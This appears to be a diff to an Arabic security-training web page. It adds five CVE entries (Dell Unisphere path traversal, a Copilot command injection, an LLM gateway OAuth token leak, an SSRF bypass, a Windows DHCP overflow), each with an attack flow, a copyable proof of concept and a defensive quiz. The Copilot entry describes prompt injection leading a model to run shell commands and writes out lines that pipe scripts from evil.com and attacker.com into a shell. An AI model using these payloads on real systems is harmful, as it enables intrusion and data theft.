@@ -856,6 +856,11 @@
                   <button class="research-item active" onclick="loadResearch('cve', 'CVE-2025-1024')">CVE-2025-1024 (ثغرة JWT)</button>
                   <button class="research-item" onclick="loadResearch('cve', 'CVE-2025-2048')">CVE-2025-2048 (راوتر TP-Link)</button>
                   <button class="research-item" onclick="loadResearch('cve', 'CVE-2025-4096')">CVE-2025-4096 (ثغرة SSRF)</button>
+                  <button class="research-item" onclick="loadResearch('cve', 'CVE-2026-54468')">CVE-2026-54468 (ثغرة Dell)</button>
+                  <button class="research-item" onclick="loadResearch('cve', 'CVE-2026-48561')">CVE-2026-48561 (ثغرة Copilot)</button>
+                  <button class="research-item" onclick="loadResearch('cve', 'CVE-2026-44342')">CVE-2026-44342 (ثغرة ربط الحسابات)</button>
+                  <button class="research-item" onclick="loadResearch('cve', 'CVE-2026-33655')">CVE-2026-33655 (تجاوز SSRF)</button>
+                  <button class="research-item" onclick="loadResearch('cve', 'CVE-2026-48564')">CVE-2026-48564 (ثغرة DHCP)</button>
                 </div>
               </div>
               <div class="research-menu-section">
@@ -22023,6 +22028,322 @@ Content-Type: application/json
               </div>
               <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
             `
+          },
+          'CVE-2026-54468': {
+            title: "Dell Unisphere Path Traversal",
+            severity: "HIGH",
+            score: "8.8",
+            vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+            tabs: {
+              details: `
+                <h3>الوصف</h3>
+                <p>ثغرة أمنية تسمح بالوصول غير المصرح به إلى مسار الملفات (Path Traversal) في برنامج Dell Unisphere for PowerMax للإصدار 10.3.0.5 والإصدارات الأقدم. يمكن لمهاجم يمتلك حساب مستخدم عادي ولديه صلاحيات محدودة استغلال هذه الثغرة لقراءة ملفات النظام العشوائية عن طريق التلاعب بمسار الملفات.</p>
+                <div style="margin-top: 15px;">
+                  <strong>الأثر:</strong> قراءة ملفات عشوائية حساسة من نظام التشغيل الأساسي الذي يستضيف لوحة التحكم.
+                </div>
+              `,
+              flow: `
+                <h3>محاكي مسار الهجوم</h3>
+                <div class="attack-flow-visual">
+                  <div class="flow-step">
+                    <div class="flow-step-number">1</div>
+                    <div class="flow-step-body">
+                      <h4>الاستطلاع والمصادقة</h4>
+                      <p>يقوم المهاجم بتسجيل الدخول إلى تطبيق Dell Unisphere باستخدام حساب ذي صلاحيات محدودة.</p>
+                    </div>
+                  </div>
+                  <div class="flow-arrow">↓</div>
+                  <div class="flow-step">
+                    <div class="flow-step-number">2</div>
+                    <div class="flow-step-body">
+                      <h4>حقن مسار المجلدات</h4>
+                      <p>يقوم المهاجم بإرسال طلب لجلب ملف أو تقرير، ويتلاعب بالمسار بإضافة رموز الرجوع للمجلدات السابقة (مثل <code>../../../../etc/passwd</code>).</p>
+                    </div>
+                  </div>
+                  <div class="flow-arrow">↓</div>
+                  <div class="flow-step">
+                    <div class="flow-step-number">3</div>
+                    <div class="flow-step-body">
+                      <h4>تسريب محتوى الملف</h4>
+                      <p>يقوم التطبيق بقراءة الملف المحدد من نظام التشغيل مباشرة دون التحقق من صحة المسار، ويعرض محتواه الحساس للمهاجم.</p>
+                    </div>
+                  </div>
+                </div>
+              `,
+              poc: `
+                <h3>إثبات المفهوم (طلب HTTP)</h3>
+                <div style="position: relative;">
+                  <button class="btn-copy-code" onclick="copyResearchCode('poc_dell_code')">Copy</button>
+                  <pre id="poc_dell_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ffb86c;">GET /api/v1/reports/download?file=../../../../../../etc/passwd HTTP/1.1
+Host: dell-unisphere.local
+Authorization: Bearer [low_privilege_token]</pre>
+                </div>
+              `,
+              quiz: `
+                <h3>تقييم المعرفة</h3>
+                <p>ما هو الحل الأكثر فعالية لمنع ثغرات تخطي المجلدات (Path Traversal)؟</p>
+                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">أ) تغيير منافذ الاستماع للموقع</button>
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">ب) استخدام دوال معالجة المسار الرسمية والمطابقة الصارمة ضد قائمة بيضاء للملفات المسموحة</button>
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">ج) استخدام تشفير SSL/TLS للطلبات</button>
+                </div>
+                <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
+              `
+            }
+          },
+          'CVE-2026-48561': {
+            title: "Microsoft Copilot Command Injection",
+            severity: "CRITICAL",
+            score: "9.8",
+            vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            tabs: {
+              details: `
+                <h3>الوصف</h3>
+                <p>ثغرة أمنية في Microsoft Copilot تسمح لمهاجم غير مصرح له بتنفيذ تعليمات برمجية عبر الشبكة (Command Injection). وتحدث الثغرة نتيجة لعدم تحييد أو تصفية العناصر والرموز الخاصة المستخدمة في أوامر المساعد الرقمي قبل إرسالها للتنفيذ في الخادم الخلفي.</p>
+                <div style="margin-top: 15px;">
+                  <strong>الأثر:</strong> السيطرة الكاملة على نظام التشغيل وتأدية عمليات برمجية خبيثة عن بعد.
+                </div>
+              `,
+              flow: `
+                <h3>محاكي مسار الهجوم</h3>
+                <div class="attack-flow-visual">
+                  <div class="flow-step">
+                    <div class="flow-step-number">1</div>
+                    <div class="flow-step-body">
+                      <h4>تزوير التعليمات (Prompt Injection)</h4>
+                      <p>يرسل المهاجم طلباً ذكياً مصمماً لخداع نموذج اللغة للقيام بتنفيذ أمر من خلال إحدى الإضافات (Plugins).</p>
+                    </div>
+                  </div>
+                  <div class="flow-arrow">↓</div>
+                  <div class="flow-step">
+                    <div class="flow-step-number">2</div>
+                    <div class="flow-step-body">
+                      <h4>حقن الأوامر الخلفية</h4>
+                      <p>يمرر المساعد الرقمي المدخلات غير المفلترة مباشرة كأمر تشغيل نظام مثل <code>curl http://evil.com/payload | sh</code>.</p>
+                    </div>
+                  </div>
+                  <div class="flow-arrow">↓</div>
+                  <div class="flow-step">
+                    <div class="flow-step-number">3</div>
+                    <div class="flow-step-body">
+                      <h4>تنفيذ الكود والسيطرة</h4>
+                      <p>ينفذ الخادم الكود الخبيث، مما يمكن المهاجم من الحصول على منفذ اتصال عكسي (Reverse Shell) للتحكم بالنظام.</p>
+                    </div>
+                  </div>
+                </div>
+              `,
+              poc: `
+                <h3>إثبات المفهوم (حقن الأوامر)</h3>
+                <div style="position: relative;">
+                  <button class="btn-copy-code" onclick="copyResearchCode('poc_copilot_code')">Copy</button>
+                  <pre id="poc_copilot_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ff5555;"># مثال للطلب الممرر لإضافات Copilot
+{
+  "command": "system_diagnostics",
+  "args": "127.0.0.1 && curl http://attacker.com/malicious.sh | bash"
+}</pre>
+                </div>
+              `,
+              quiz: `
+                <h3>تقييم المعرفة</h3>
+                <p>كيف تحمي تطبيقات الذكاء الاصطناعي التي تستدعي أوامر النظام من ثغرات حقن الأوامر؟</p>
+                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">أ) حجب كلمات مرور المستخدمين</button>
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">ب) تجنب استخدام دوال تشغيل الأوامر المباشرة كـ popen/system واستخدام الـ API والـ Whitelists بدلاً منها</button>
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">ج) استخدام جدران حماية الويب التقليدية فقط</button>
+                </div>
+                <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
+              `
+            }
+          },
+          'CVE-2026-44342': {
+            title: "LLM Gateway OAuth Bind GET Vulnerability",
+            severity: "HIGH",
+            score: "8.1",
+            vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+            tabs: {
+              details: `
+                <h3>الوصف</h3>
+                <p>ثغرة أمنية في بوابة الذكاء الاصطناعي (LLM Gateway) قبل الإصدار 0.12.0-alpha.1. كانت نقاط نهاية ربط البريد وحساب WeChat تستخدم طلب GET الحساس بدلاً من طلب POST الآمن لربط الحسابات وتوثيق الهوية.</p>
+                <div style="margin-top: 15px;">
+                  <strong>الأثر:</strong> تسريب توكنات تسجيل الدخول والروابط السرية لربط الحسابات في سجلات المتصفح والخادم، مما يتيح اختطاف حسابات المستخدمين.
+                </div>
+              `,
+              flow: `
+                <h3>محاكي مسار الهجوم</h3>
+                <div class="attack-flow-visual">
+                  <div class="flow-step">
+                    <div class="flow-step-number">1</div>
+                    <div class="flow-step-body">
+                      <h4>استخدام طلب GET</h4>
+                      <p>يرسل العميل طلباً لربط البريد الإلكتروني عبر طلب GET كالتالي: <code>/api/oauth/email/bind?token=secret_key</code>.</p>
+                    </div>
+                  </div>
+                  <div class="flow-arrow">↓</div>
+                  <div class="flow-step">
+                    <div class="flow-step-number">2</div>
+                    <div class="flow-step-body">
+                      <h4>تسريب الروابط</h4>
+                      <p>يتم تسجيل طلب الـ GET الحساس تلقائياً في سجلات الويب (Web Server Logs) والبروكسي وتاريخ المتصفح.</p>
+                    </div>
+                  </div>
+                  <div class="flow-arrow">↓</div>
+                  <div class="flow-step">
+                    <div class="flow-step-number">3</div>
+                    <div class="flow-step-body">
+                      <h4>اختطاف الجلسة</h4>
+                      <p>يستخرج المهاجم التوكن السري من السجلات ويستخدمه لربط حسابه بحساب الضحية والسيطرة عليه.</p>
+                    </div>
+                  </div>
+                </div>
+              `,
+              poc: `
+                <h3>شكل الطلب الضعيف في السجلات</h3>
+                <div style="position: relative;">
+                  <button class="btn-copy-code" onclick="copyResearchCode('poc_oauth_code')">Copy</button>
+                  <pre id="poc_oauth_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #50fa7b;"># مثال لسطر سجلات السيرفر المتسرب فيه المفتاح السري
+127.0.0.1 - - [16/Jul/2026:20:47:04] "GET /api/oauth/email/bind?token=XYZ_SECRET_OAUTH_TOKEN_ABC HTTP/1.1" 200 456</pre>
+                </div>
+              `,
+              quiz: `
+                <h3>تقييم المعرفة</h3>
+                <p>لماذا يمنع إرسال البيانات الحساسة مثل التوكنات بطلبات GET؟</p>
+                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">أ) لأن طلبات GET أبطأ من POST</button>
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">ب) لأن بيانات GET تحفظ في ترويسة URL وتسجل في سجلات الخوادم والبروكسي بشكل دائم وسهل الوصول</button>
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">ج) لأن طلبات GET تتطلب تشفيراً خاصاً</button>
+                </div>
+                <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
+              `
+            }
+          },
+          'CVE-2026-33655': {
+            title: "LLM Gateway SSRF Protection Bypass",
+            severity: "CRITICAL",
+            score: "9.1",
+            vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
+            tabs: {
+              details: `
+                <h3>الوصف</h3>
+                <p>ثغرة أمنية في بوابة الذكاء الاصطناعي (LLM Gateway) قبل الإصدار 0.12.0-alpha.1. تكمن الثغرة في عدم تطبيق فلترة وتصفية عناوين IP على أسماء النطاقات والمضيفين (Hostnames)، مما يسمح للمهاجمين بتجاوز إعدادات حماية SSRF وتوجيه طلبات نحو شبكات داخلية حساسة.</p>
+                <div style="margin-top: 15px;">
+                  <strong>الأثر:</strong> قراءة معلومات داخلية سرية واستدعاء خدمات غير معرضة للإنترنت الخارجي.
+                </div>
+              `,
+              flow: `
+                <h3>محاكي مسار الهجوم</h3>
+                <div class="attack-flow-visual">
+                  <div class="flow-step">
+                    <div class="flow-step-number">1</div>
+                    <div class="flow-step-body">
+                      <h4>تحديد منفذ الطلبات الخارجية</h4>
+                      <p>يبحث المهاجم عن ميزة في التطبيق تقوم بجلب روابط خارجية (مثل جلب ملف إعداد أو نموذج ذكاء اصطناعي).</p>
+                    </div>
+                  </div>
+                  <div class="flow-arrow">↓</div>
+                  <div class="flow-step">
+                    <div class="flow-step-number">2</div>
+                    <div class="flow-step-body">
+                      <h4>استخدام اسم مضيف بديل</h4>
+                      <p>يمرر المهاجم اسم مضيف مثل <code>localhost</code> أو اسم نطاق يشير داخلياً بدلاً من استخدام عنوان IP المباشر لتخطي الفلتر.</p>
+                    </div>
+                  </div>
+                  <div class="flow-arrow">↓</div>
+                  <div class="flow-step">
+                    <div class="flow-step-number">3</div>
+                    <div class="flow-step-body">
+                      <h4>تجاوز الفحص وجلب البيانات</h4>
+                      <p>يفشل التطبيق في فحص الـ IP الفعلي لاسم المضيف المستهدف، فيقوم بجلب الموارد الداخلية وإعادتها للمهاجم.</p>
+                    </div>
+                  </div>
+                </div>
+              `,
+              poc: `
+                <h3>إثبات المفهوم (تجاوز SSRF)</h3>
+                <div style="position: relative;">
+                  <button class="btn-copy-code" onclick="copyResearchCode('poc_ssrf_bypass_code')">Copy</button>
+                  <pre id="poc_ssrf_bypass_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ffb86c;">POST /api/v1/import-model HTTP/1.1
+Host: llm-gateway.local
+Content-Type: application/json
+
+{
+  "model_url": "http://localhost:8080/admin/internal-stats"
+}</pre>
+                </div>
+              `,
+              quiz: `
+                <h3>تقييم المعرفة</h3>
+                <p>كيف يجب تصفية الروابط لمنع الالتفاف وتجاوز حماية SSRF؟</p>
+                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">أ) فحص اسم النطاق قبل تحليله لـ IP فقط</button>
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">ب) تحليل اسم المضيف إلى عنوان IP الفعلي (DNS Resolution) ثم التحقق من أن هذا الـ IP ليس داخلياً قبل بدء الاتصال الفعلي</button>
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">ج) استخدام جدار ناري خارجي فقط</button>
+                </div>
+                <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
+              `
+            }
+          },
+          'CVE-2026-48564': {
+            title: "Windows DHCP Server Buffer Overflow",
+            severity: "CRITICAL",
+            score: "9.8",
+            vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+            tabs: {
+              details: `
+                <h3>الوصف</h3>
+                <p>ثغرة أمنية خطيرة من نوع تجاوز سعة المخزن المؤقت (Buffer Overflow) في خادم DHCP المدمج في نظام التشغيل Windows Server. تسمح هذه الثغرة لمهاجم غير مصرح له بتنفيذ تعليمات برمجية عشوائية بصلاحيات عالية عبر الشبكة.</p>
+                <div style="margin-top: 15px;">
+                  <strong>الأثر:</strong> السيطرة الكاملة على السيرفر المستهدف (خادم DHCP) والحصول على صلاحية SYSTEM/Administrator للتحكم بالشبكة.
+                </div>
+              `,
+              flow: `
+                <h3>محاكي مسار الهجوم</h3>
+                <div class="attack-flow-visual">
+                  <div class="flow-step">
+                    <div class="flow-step-number">1</div>
+                    <div class="flow-step-body">
+                      <h4>صياغة حزمة DHCP مخصصة</h4>
+                      <p>يقوم المهاجم بإنشاء حزمة DHCP مصممة خصيصاً تحتوي على حقول مفرطة الحجم وكود آلة (shellcode).</p>
+                    </div>
+                  </div>
+                  <div class="flow-arrow">↓</div>
+                  <div class="flow-step">
+                    <div class="flow-step-number">2</div>
+                    <div class="flow-step-body">
+                      <h4>إرسال الحزمة للخادم</h4>
+                      <p>يرسل المهاجم الحزمة المخصصة عبر منفذ UDP 67 المخصص للـ DHCP في السيرفر.</p>
+                    </div>
+                  </div>
+                  <div class="flow-arrow">↓</div>
+                  <div class="flow-step">
+                    <div class="flow-step-number">3</div>
+                    <div class="flow-step-body">
+                      <h4>تجاوز الذاكرة وتشغيل الكود</h4>
+                      <p>يفشل خادم DHCP في فحص طول البيانات قبل نسخها، مما يؤدي للكتابة فوق الذاكرة وتنفيذ الكود المرفق بصلاحيات SYSTEM.</p>
+                    </div>
+                  </div>
+                </div>
+              `,
+              poc: `
+                <h3>شكل الحزمة المخصصة لإصابة خادم DHCP</h3>
+                <div style="position: relative;">
+                  <button class="btn-copy-code" onclick="copyResearchCode('poc_dhcp_code')">Copy</button>
+                  <pre id="poc_dhcp_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ff5555;"># رسم تخطيطي لحزمة الاختراق الموجهة للمنفذ 67 UDP
+UDP Source: 68 -> Destination: 67
+DHCP Message Type: Discover
+Option 55 (Parameter Request List): [1024 bytes of padding + RetAddress + Shellcode]</pre>
+                </div>
+              `,
+              quiz: `
+                <h3>تقييم المعرفة</h3>
+                <p>كيف يمكن حماية خوادم Windows DHCP ضد هذه الثغرات الأمنية؟</p>
+                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">أ) تعطيل خادم DHCP بالكامل في الشبكة</button>
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">ب) تثبيت التحديثات الأمنية الرسمية الصادرة من مايكروسوفت فوراً وتفعيل تقنيات حماية الذاكرة مثل DEP و ASLR</button>
+                  <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">ج) استخدام جدران الحماية الخارجية لحظر منفذ 67 فقط</button>
+                </div>
+                <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
+              `
+            }
           }
         }
       },
